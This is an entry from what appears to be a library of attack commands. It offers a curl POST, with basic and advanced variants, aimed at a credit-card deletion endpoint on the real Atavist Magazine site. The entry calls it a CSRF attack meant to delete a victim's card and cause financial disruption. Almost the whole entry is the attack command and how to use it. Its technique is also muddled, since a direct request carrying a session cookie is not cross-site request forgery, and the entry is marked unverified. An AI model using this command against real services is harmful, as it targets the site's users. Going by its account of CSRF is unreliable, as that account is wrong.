---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X POST -b "session_id=abc123"
  https://atavist.com/cms/ajax/delete_credit_card.php -d
  "user_id=123&card_id=456"
tags:
  - csrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.143Z'
verified: false
validated: true
submitted: true
---
# curl-csrf-credit-delete

## Command

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/delete_credit_card.php -d "user_id=123&card_id=456"
```

## Description

Forges a request to delete a credit card from the victim's account in Atavist Magazine, exploiting CSRF absence to cause financial disruption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-b "session_id=abc123"` | Session cookie | Yes |
| `-d "user_id=123&card_id=456"` | User and card identifiers | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -b "session_id=abc123" https://atavist.com/cms/ajax/delete_credit_card.php -d "user_id=123&card_id=456"
```

### Advanced Usage

```bash
curl -X POST -b "session_id=abc123" -d "user_id=123&card_id=456&reason=fraud" https://atavist.com/cms/ajax/delete_credit_card.php
```

## Expected Output

200 OK with {"status": "deleted"}. Error if card not found: 404.

## Related

- [[commands/curl-csrf-email-change]]
- [[procedures/Demonstrate-CSRF-Exploitation]]
